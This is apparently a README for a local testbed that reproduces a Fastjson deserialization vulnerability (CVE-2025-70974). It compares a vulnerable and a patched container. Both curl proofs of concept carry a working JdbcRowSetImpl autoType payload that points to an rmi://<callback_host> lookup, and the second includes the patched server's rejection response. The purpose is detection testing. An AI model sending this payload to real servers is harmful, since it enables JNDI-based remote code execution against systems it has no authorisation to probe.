# CVE-2025-70974

Testbed is in fastjson-playground.
```
cd fastjson-playground
docker-compose up
```

In each Dockerfile, a different pom.xml file is used, with a different version of Fastjson. This is configured as the default JSON parser for the web server. It uses Fastjson version 1.2.83 for the safe container and 1.2.45 for the vulnerable container.


## Note for testing
Detection requires a DNS interaction. Configure the callback server appropriately.



## Proof of concept for vulnerable instance:
```
curl -X POST http://localhost:8081/ \
  -H "Content-Type: application/json" \
  -d '{
    "a": {
      "@type": "java.lang.Class",
      "val": "com.sun.rowset.JdbcRowSetImpl"
    },
    "b": {
      "@type": "com.sun.rowset.JdbcRowSetImpl",
      "dataSourceName": "rmi://<callback_host>/NoObjectHere",
      "autoCommit": true
    }
  }'
```
Response hangs, DNS request received.


## Proof of concept for safe instance:
```
curl -X POST http://localhost:8082/ \
  -H "Content-Type: application/json" \
  -d '{
    "a": {
      "@type": "java.lang.Class",
      "val": "com.sun.rowset.JdbcRowSetImpl"
    },
    "b": {
      "@type": "com.sun.rowset.JdbcRowSetImpl",
      "dataSourceName": "rmi://<callback_host>/NoObjectHere",
      "autoCommit": true
    }
  }'
```
Response:
```
{
	"timestamp":1769092268366,
	"status":400,
	"error":"Bad Request",
	"exception":"org.springframework.http.converter.HttpMessageNotReadableException",
	"message":"JSON parse error: autoType is not support. com.sun.rowset.JdbcRowSetImpl; nested exception is com.alibaba.fastjson.JSONException: autoType is not support. com.sun.rowset.JdbcRowSetImpl",
	"path":"/"
}
```
